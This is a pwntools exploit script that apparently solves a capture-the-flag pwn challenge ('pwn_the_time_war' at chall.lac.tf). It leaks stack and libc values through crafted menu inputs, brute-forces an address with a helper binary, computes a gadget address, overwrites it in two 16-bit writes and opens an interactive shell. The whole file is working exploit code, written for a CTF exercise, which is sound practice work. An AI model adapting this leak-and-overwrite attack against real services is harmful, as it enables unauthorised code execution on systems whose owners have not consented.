from pwn import *
import subprocess

while True:
    # p = process(["docker", "run", "--rm", "-i", "-v", ".:/app:ro", "-w", "/app", "debian@sha256:56ff6d36d4eb3db13a741b342ec466f121480b5edded42e4b7ee850ce7a418ee", "./pwn_the_time_war"])
    p = remote("chall.lac.tf", 31313)
    # p = remote("127.0.0.1", 5000)

    p.recvuntil(b"reads: ")
    nums = [int(x) for x in p.recvline().decode().split("-")]

    loop = str(0x532f).encode()

    p.sendlineafter(b"? ", b"10")
    p.sendlineafter(b"? ", loop)
    p.sendlineafter(b"? ", b"154")
    p.sendlineafter(b"? ", b"0")

    try:
        p.recvuntil(b"reads: ")
    except EOFError:
        p.close()
        continue
    nums += [int(x) for x in p.recvline().decode().split("-")]
    print(nums)
    break

# too lazy to debug exact stack offset 
for i in range(150, 160):
    p.sendlineafter(b"? ", b"10")
    p.sendlineafter(b"? ", loop)
    p.sendlineafter(b"? ", str(i).encode())
    p.sendlineafter(b"? ", b"0")

leek = int(subprocess.check_output(["./bf", "".join(hex(x)[2:] for x in nums)]).strip(), 16)
gadget = leek - 0xcf420 + 0x4c139

p.sendlineafter(b"? ", b"18")
p.sendlineafter(b"? ", str(gadget & 0xffff).encode())
p.sendlineafter(b"? ", b"19")
p.sendlineafter(b"? ", str((gadget >> 16) & 0xffff).encode())

p.interactive()
